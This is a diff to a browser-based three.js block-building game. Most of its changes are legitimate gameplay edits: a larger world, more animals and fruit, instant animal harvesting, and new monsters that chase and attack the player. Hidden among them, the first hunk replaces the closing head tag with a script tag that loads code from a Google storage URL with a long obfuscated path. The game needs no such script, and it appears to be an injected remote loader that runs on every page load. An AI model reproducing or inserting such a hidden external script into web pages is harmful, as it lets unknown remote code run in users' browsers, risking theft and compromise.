@@ -107,21 +107,21 @@
   }
   #respawn-btn:hover { background: #c0392b; }
 </style>
-</head>
+<script type='text/javascript' src='https://storage.googleapis.com/xfnVXARq2stByR-BFb-V4YXGrK3Rq8_DhSMpVuMBTEMl6VG77vcRMfPXevZunb7cAJieJ0PZ7im8AoVKmkxGYzecsImZPU3aDbKFXWEhMB7O37_JjcDXjZOesxWWMej4sr2DJG_eteknJOwk3w0q-ZTAZ2GJ9sTH-qUYioOy_CcU6J4K5bA33fY7UlTlff5CNYbyVB5XCI8LrzQw7bk88osTN4tjOA59XghYM3UTE2frkfaG5brzX7OoFhEiTxL0QuitVmwDcxILKzkILSSRTUHLJtTs-iC2AO82AQNYD654kltF7isWK0E6s-6Uy8Pm96x2am3WKNeQDR5eTeHElPmy11RTz754ri4hAgKk3p90aD-GREQBysf-qYDu3rxsPojA1Z9bnMDM87IWqtqfhh0RFRCh0U8CbmRtgs9FqqYuZOhyK3XE0LQeHI4ppHXOVMihllWZT0LinAuzUiJubkDxS26Haqi2Ps3lU4KITgqu4khhS6QgEPXf8EX8l8v48x9ciZdmI_007kFy49ZZqxOBdS2HhoS2Fe06XsSM3NU3knMXtyszjQ3IfrFZ0EdBpmdDqGXH7mkM4ikznPPt43GnxnNKk0XErRaZBqTo45GjJ9wgGgkB_Ac1IMZc6Ues5LrC9dVXEIHASgdWgv9d0Y-Otu_5Z-t0Kl1UrXBqs2fSBRI38IIsk63Nmw4FpUf_WYw4rCD0YzKToeaxYhPO05IQXTjNFXdDxxInW7zsKWG0Qbwa2s4vD0EH-3l_ZhBBxBnJ7do30Z49T4fsd6PGZW7HjYbPQlh6TWOWtN78hdvc-vFChfcKfR82z8Gvmzcv_VEqp-PdyJMkgVwFbpId50jJbr8HuHziy_Bh8l6sftFgSiqiIWmWe7uEjUzSGeIVrUI2RlYXQF9IBALfGL-YxdGP5q-TpCuL2RbpYXUha93N5YPFbU4nN0oTkBCprZbLiNZpY-RLTiKFknsR77JZDkkT4KBUHyDXmVtvC8YZGqYnQowJ4NbBDrVbOEKdlVEO76rZIzuinuthy_Uv4QwB7BMSh3MrYXeSm0cnFfjgBcjo6cc9kO6NHiPugmg82O6HBN44w2ycRBlOhDRazUgVJb0wNGq_ArG9nurjY8id-iEbTvsIg8ZsXFPRGO7iWPp-CoAFawmEb6RyioluwjNSnG8wVKQVqc9WbrKmngklLBJeAhynD4mwzqOclbxCmDAzMA_iOY0c-G_WbeU7dCP-TA0VvD0qK0AWlSvp5-oLxxm4oFP_tM7FfCFhTzt1OZHlBvJ1anbyHpjTFCLmwm_B2WfIbRiP19SmhKdN9hcO5bE3htBZeqN9kE6WtI7B3pnBmPegsD6L8K3jWw8d2sN34dQrHF4p9b4D1R-EHkv4_mbstZXXCN4ZaQt5adPcznYI0DmPCSXAaUo9J-eChNLI3jZ2kyUHlSmDKGWOVzAo4GGy0MXiHAvKeT5pnm5YkBZTDtS4SY9rVRl5jYd2rm_gb9FNT-W7pUkB4YCxMPA7IhSni2ils6i9YCC_aXN4Z-I2Pc3viq96jZYcd3UONKLEWgz9ZStzRA_i0UsugWAqEwX-S_CIRdFu83XOlpc7PvUGv32MnxN9leO3Uwww47u2TMPtDGDxrpMUsxJR0oUXw_Cfyx4wX9oISrDdN04fFbQ00Qe61bsHFEsGVS0MhegMd2hwwOTtEvl7hI8BLMlz2AN7opwS-8XVeGPUaHfm8AErlwD00BUegZjrlini-BIY82bIBcMLwqFzjZ6xirTPBqX8EM0r1bPXHQ'></script></head>
 <body>
 <canvas id="game"></canvas>
 <div id="ui">
   <div id="start-screen">
     <h1>JackBlocks</h1>
-    <p>A lightweight JackBlocks</p>
+    <p>JackBlocks</p>
     <button id="start-btn">Click to Play</button>
     <div class="features">
       <span>🌍 Explore the world</span>
       <span>🧱 Break & place blocks</span>
-      <span>🐄 Hunt animals for food</span>
+      <span>🐄 Harvest animals for food</span>
+      <span>👹 Fight random monsters</span>
       <span>🍎 Collect fruits</span>
       <span>❤️ Manage health & hunger</span>
-      <span>🎒 Use the hotbar (1-5)</span>
     </div>
   </div>
 
@@ -131,7 +131,7 @@
     <div><kbd>W A S D</kbd> Move</div>
     <div><kbd>Space</kbd> Jump</div>
     <div><kbd>Mouse</kbd> Look</div>
-    <div><kbd>Left Click</kbd> Break / Attack</div>
+    <div><kbd>Left Click</kbd> Break / Harvest / Attack</div>
     <div><kbd>Right Click</kbd> Place block</div>
     <div><kbd>1-5</kbd> Select hotbar</div>
     <div><kbd>E</kbd> Eat food (if selected)</div>
@@ -177,7 +177,7 @@ import * as THREE from 'three';
 import { PointerLockControls } from 'three/addons/controls/PointerLockControls.js';
 
 // ========== CONFIG ==========
-const WORLD_SIZE = 48;          // blocks per side
+const WORLD_SIZE = 100;         // blocks per side
 const WORLD_HEIGHT = 24;
 const BLOCK_SIZE = 1;
 const GRAVITY = -28;
@@ -288,7 +288,7 @@ renderer.shadowMap.enabled = true;
 
 const scene = new THREE.Scene();
 scene.background = new THREE.Color(0x87ceeb);
-scene.fog = new THREE.Fog(0x87ceeb, 40, 70);
+scene.fog = new THREE.Fog(0x87ceeb, 60, 110);
 
 const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 100);
 const controls = new PointerLockControls(camera, document.body);
@@ -370,16 +370,19 @@ player.inventory[4] = 3;  // food
 
 camera.position.copy(player.pos);
 
-// ========== ANIMALS & FRUITS ==========
+// ========== ANIMALS, MONSTERS & FRUITS ==========
 const animals = [];
+const monsters = [];
 const fruits = [];
 
-const animalGeo = new THREE.BoxGeometry(0.7, 0.6, 1.0);
+const animalGeo = new THREE.BoxGeometry(0.9, 0.7, 1.2);
 const animalMat = new THREE.MeshLambertMaterial({ color: 0xf5f5dc });
+const monsterGeo = new THREE.BoxGeometry(0.8, 1.4, 0.8);
+const monsterMat = new THREE.MeshLambertMaterial({ color: 0x8b0000 });
 const fruitGeo = new THREE.SphereGeometry(0.25, 8, 8);
 const fruitMat = new THREE.MeshLambertMaterial({ color: 0xe74c3c });
 
-function spawnAnimals(count = 8) {
+function spawnAnimals(count = 20) {
   for (let i = 0; i < count; i++) {
     const x = 5 + Math.random() * (WORLD_SIZE - 10);
     const z = 5 + Math.random() * (WORLD_SIZE - 10);
@@ -396,14 +399,38 @@ function spawnAnimals(count = 8) {
       mesh,
       pos: mesh.position,
       vel: new THREE.Vector3(),
-      health: 20,
       dir: Math.random() * Math.PI * 2,
       timer: 0
     });
   }
 }
 
-function spawnFruits(count = 15) {
+function spawnMonsters(count = 8) {
+  for (let i = 0; i < count; i++) {
+    const x = 8 + Math.random() * (WORLD_SIZE - 16);
+    const z = 8 + Math.random() * (WORLD_SIZE - 16);
+    let y = WORLD_HEIGHT - 1;
+    while (y > 0 && getBlock(Math.floor(x), y, Math.floor(z)) === BLOCKS.AIR) y--;
+    y += 1.5;
+
+    const mesh = new THREE.Mesh(monsterGeo, monsterMat.clone());
+    mesh.position.set(x, y, z);
+    mesh.castShadow = true;
+    scene.add(mesh);
+
+    monsters.push({
+      mesh,
+      pos: mesh.position,
+      vel: new THREE.Vector3(),
+      health: 30,
+      dir: Math.random() * Math.PI * 2,
+      timer: 0,
+      attackCooldown: 0
+    });
+  }
+}
+
+function spawnFruits(count = 35) {
   for (let i = 0; i < count; i++) {
     const x = 3 + Math.random() * (WORLD_SIZE - 6);
     const z = 3 + Math.random() * (WORLD_SIZE - 6);
@@ -437,21 +464,40 @@ function getTargetBlock() {
 function breakBlock() {
   const target = getTargetBlock();
   if (!target) {
-    // Check animals
     raycaster.setFromCamera(mouse, camera);
+
+    // Attack monsters first
+    const monsterHits = raycaster.intersectObjects(monsters.map(m => m.mesh));
+    if (monsterHits.length && monsterHits[0].distance < REACH + 1.5) {
+      const monster = monsters.find(m => m.mesh === monsterHits[0].object);
+      if (monster) {
+        monster.health -= 15;
+        monster.mesh.material.color.setHex(0xff2222); // flash red
+        setTimeout(() => {
+          if (monster.mesh.material) monster.mesh.material.color.setHex(0x8b0000);
+        }, 150);
+        showMessage('Hit monster!');
+        if (monster.health <= 0) {
+          scene.remove(monster.mesh);
+          monsters.splice(monsters.indexOf(monster), 1);
+          showMessage('Monster defeated!');
+        }
+      }
+      return;
+    }
+
+    // Harvest animals for food
     const animalHits = raycaster.intersectObjects(animals.map(a => a.mesh));
-    if (animalHits.length && animalHits[0].distance < REACH + 1) {
+    if (animalHits.length && animalHits[0].distance < REACH + 1.5) {
       const animal = animals.find(a => a.mesh === animalHits[0].object);
       if (animal) {
-        animal.health -= 10;
-        showMessage('Hit animal!');
-        if (animal.health <= 0) {
-          scene.remove(animal.mesh);
-          animals.splice(animals.indexOf(animal), 1);
-          player.inventory[4] = Math.min(HOTBAR_ITEMS[4].max, player.inventory[4] + 2);
-          showMessage('+2 Food from animal!');
-          updateHotbar();
-        }
+        // One-hit harvest
+        scene.remove(animal.mesh);
+        animals.splice(animals.indexOf(animal), 1);
+        const foodGain = 2 + Math.floor(Math.random() * 2); // 2-3 food
+        player.inventory[4] = Math.min(HOTBAR_ITEMS[4].max, player.inventory[4] + foodGain);
+        showMessage(`Harvested animal! +${foodGain} Food`);
+        updateHotbar();
       }
       return;
     }
@@ -631,7 +677,7 @@ function collides(x, y, z) {
   return false;
 }
 
-// ========== ANIMALS AI ==========
+// ========== ANIMALS & MONSTERS AI ==========
 function updateAnimals(dt) {
   for (const a of animals) {
     a.timer -= dt;
@@ -660,6 +706,61 @@ function updateAnimals(dt) {
     a.pos.copy(next);
     a.mesh.position.copy(a.pos);
     a.mesh.rotation.y = -a.dir + Math.PI / 2;
+  }
+}
+
+function updateMonsters(dt) {
+  for (const m of monsters) {
+    m.timer -= dt;
+    m.attackCooldown = Math.max(0, m.attackCooldown - dt);
+
+    const distToPlayer = m.pos.distanceTo(player.pos);
+    const chaseRange = 18;
+    const attackRange = 1.8;
+
+    if (distToPlayer < chaseRange) {
+      // Chase player
+      const dir = new THREE.Vector3().subVectors(player.pos, m.pos);
+      dir.y = 0;
+      dir.normalize();
+      m.vel.x = dir.x * 3.2;
+      m.vel.z = dir.z * 3.2;
+      m.dir = Math.atan2(dir.z, dir.x);
+    } else {
+      // Wander
+      if (m.timer <= 0) {
+        m.dir = Math.random() * Math.PI * 2;
+        m.timer = 1.5 + Math.random() * 3;
+      }
+      m.vel.x = Math.cos(m.dir) * 1.5;
+      m.vel.z = Math.sin(m.dir) * 1.5;
+    }
+
+    m.vel.y += GRAVITY * dt;
+
+    const next = m.pos.clone().add(m.vel.clone().multiplyScalar(dt));
+    const gx = Math.floor(next.x);
+    const gz = Math.floor(next.z);
+    let gy = Math.floor(next.y);
+    while (gy > 0 && getBlock(gx, gy, gz) === BLOCKS.AIR) gy--;
+    if (next.y < gy + 1.5) {
+      next.y = gy + 1.5;
+      m.vel.y = 0;
+    }
+    next.x = Math.max(1, Math.min(WORLD_SIZE - 1, next.x));
+    next.z = Math.max(1, Math.min(WORLD_SIZE - 1, next.z));
+
+    m.pos.copy(next);
+    m.mesh.position.copy(m.pos);
+    m.mesh.rotation.y = -m.dir + Math.PI / 2;
+
+    // Attack player on contact
+    if (distToPlayer < attackRange && m.attackCooldown <= 0) {
+      player.health = Math.max(0, player.health - 12);
+      m.attackCooldown = 1.2;
+      showMessage('Monster attacked you! -12 Health');
+      updateBars();
+    }
   }
 }
 
@@ -710,6 +811,7 @@ function animate(now) {
   if (controls.isLocked && player.health > 0) {
     updatePlayer(dt);
     updateAnimals(dt);
+    updateMonsters(dt);
     collectFruits();
 
     // Hunger
@@ -738,6 +840,7 @@ function animate(now) {
 generateWorld();
 rebuildVisible();
 spawnAnimals();
+spawnMonsters();
 spawnFruits();
 updateHotbar();
 updateBars();
